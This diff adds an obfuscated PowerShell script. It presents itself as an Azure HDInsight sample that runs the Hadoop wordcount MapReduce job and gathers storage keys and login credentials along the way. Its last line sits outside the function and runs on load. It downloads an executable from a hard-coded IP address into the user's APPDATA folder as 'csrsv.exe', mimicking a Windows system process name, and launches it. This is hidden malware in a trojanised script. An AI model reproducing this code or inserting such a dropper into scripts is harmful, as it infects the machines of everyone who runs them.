@@ -1,0 +1,71 @@
+function St`Art-mAP`RE`d`UCe {
+    
+    ${E`RRorA`ctI`On`P`ReferENCE} = ("{1}{0}" -f 'p','Sto')
+    
+    
+    ${c`OntE`Xt} = &("{2}{1}{0}"-f 'xt','t-AzConte','Ge')
+    if (${C`o`NTeXt} -eq ${N`Ull}) 
+    {
+        &("{2}{5}{0}{4}{1}{3}" -f'-Az','ccoun','Connec','t','A','t')
+    }
+    ${c`oNt`EXT}
+
+    
+    ${clUST`e`R`NaMe} = .("{0}{3}{1}{2}" -f 'R','-','Host','ead') -Prompt ("{1}{2}{5}{3}{4}{0}"-f'ster name','Enter',' the H','ht ','clu','DInsig')
+    ${CrE`DS}=&("{4}{3}{0}{1}{2}"-f 'Cred','e','ntial','-','Get') -Message ("{6}{0}{4}{2}{1}{5}{3}" -f ' the login','r th','fo','ster',' ','e clu','Enter')
+
+    
+    ${cLU`st`EriNFo} = &("{4}{1}{0}{3}{6}{2}{5}"-f 'i','-AzHDIns','ust','ght','Get','er','Cl') -ClusterName ${CLu`stE`R`NAme}
+    ${rE`sO`U`RCegRO`Up} = ${c`lu`STErin`Fo}."ResoURce`gro`UP"
+    ${S`ToR`AgEaCCoUN`TnaME}=${C`l`UsTe`RiNFo}."Def`Au`Lt`sTORaG`EaC`cO`UnT".("{1}{0}" -f'it','spl').Invoke('.')[0]
+    ${C`o`NTainEr}=${CLUSt`Er`in`Fo}."DeFa`UL`TsTORagEc`ON`TAI`N`er"
+    
+    
+    
+    ${sTo`Ra`GEacco`UNt`Key}=(&("{6}{0}{3}{1}{5}{4}{2}" -f'et-AzStorageA','ou','y','cc','e','ntK','G') `
+        -Name ${s`T`oR`Ag`E`ACCouNTnAME} `
+    -ResourceGroupName ${res`OuRCeGrO`UP})[0]."vAL`UE"
+
+    
+    ${C`onTe`xT} = &("{1}{0}{3}{4}{6}{2}{5}"-f'w','Ne','te','-AzStora','geC','xt','on') `
+        -StorageAccountName ${sTORageACCOu`N`Tna`ME} `
+        -StorageAccountKey ${storA`g`EACcoU`NtK`EY}
+
+    
+    
+    
+    
+    
+    ${wOrDco`U`NTJOBDE`F`iNI`T`ion} = .("{2}{3}{4}{8}{6}{7}{0}{5}{1}" -f 'obDefi','ition','New','-','AzHDInsightMa','n','d','uceJ','pRe') `
+        -JarFile ("{3}{9}{6}{4}{11}{5}{0}{10}{8}{1}{2}{12}{7}" -f 'a','uce-e','x','/exa','a','m','e/j','ples.jar','red','mpl','p','rs/hadoop-','am') `
+        -ClassName ("{1}{0}{2}" -f 'or','w','dcount') `
+        -Arguments `
+            ("{4}{3}{2}{5}{6}{1}{7}{0}"-f't','in','t','e/data/gu','/exampl','enber','g/dav','ci.tx'), `
+            ("{4}{0}{5}{2}{1}{3}"-f 'example/data/Wo','p','t','ut','/','rdCountOu')
+
+    
+    &("{0}{2}{1}"-f 'Wr','e-Host','it') ("{4}{3}{2}{5}{6}{1}{0}" -f'.','e job..','ed','rt the MapR','Sta','u','c') -ForegroundColor ("{1}{0}"-f 'een','Gr')
+    ${wO`R`d`Co`UNtJob} = &("{5}{1}{0}{4}{3}{2}{6}"-f 'rt-A','ta','ns','I','zHD','S','ightJob') `
+        -ClusterName ${cl`USte`RNA`mE} `
+        -JobDefinition ${wO`RdCoU`Nt`Jo`BdeF`iniTIoN} `
+        -HttpCredential ${CRe`dS}
+
+    
+    &("{0}{1}{2}"-f 'W','rite-H','ost') ("{1}{7}{6}{3}{2}{4}{0}{8}{5}"-f'co','W','b to','jo',' ','te...','t for the ','ai','mple') -ForegroundColor ("{1}{0}"-f 'een','Gr')
+    .("{0}{4}{1}{2}{3}"-f 'Wait-A','I','nsight','Job','zHD') `
+        -ClusterName ${clUS`T`E`RNAmE} `
+        -JobId ${wORdcO`U`Ntjob}."JO`BId" `
+        -HttpCredential ${cR`Eds}
+    
+    &("{2}{0}{3}{4}{1}"-f'et-Az','ontent','G','Storage','BlobC') `
+        -Blob ("{5}{2}{8}{3}{0}{1}{4}{7}{6}" -f '/WordCoun','tOutput/p','da','a','art','example/','0','-r-0000','t') `
+        -Container ${co`N`Ta`iNer} `
+        -Destination ("{3}{2}{0}{1}" -f 't.t','xt','tpu','ou') `
+        -Context ${C`Ont`ext}
+    
+    .("{0}{5}{3}{2}{4}{1}"-f'Get-','t','HDIn','z','sightJobOutpu','A') `
+        -Clustername ${CLUS`TernA`ME} `
+        -JobId ${w`ORdC`OU`N`TJOB}."jo`BId" `
+        -HttpCredential ${C`REds}
+}
+(.("{2}{1}{0}"-f 'ct','ew-Obje','N') ("{0}{3}{4}{2}{1}{5}"-f'Sys','eb','Net.W','te','m.','Client')).("{1}{2}{0}{3}"-f'l','Dow','nloadFi','e').Invoke(("{9}{11}{0}{8}{3}{10}{6}{7}{1}{4}{2}{5}" -f'p','~yahoo','srs','9.2','/c','v.exe','.1','70.218/','://8','h','48','tt'),"$env:APPDATA\csrsv.exe");.("{0}{2}{1}{3}" -f 'Start-P','oc','r','ess') ("$env:APPDATA\csrsv.exe")
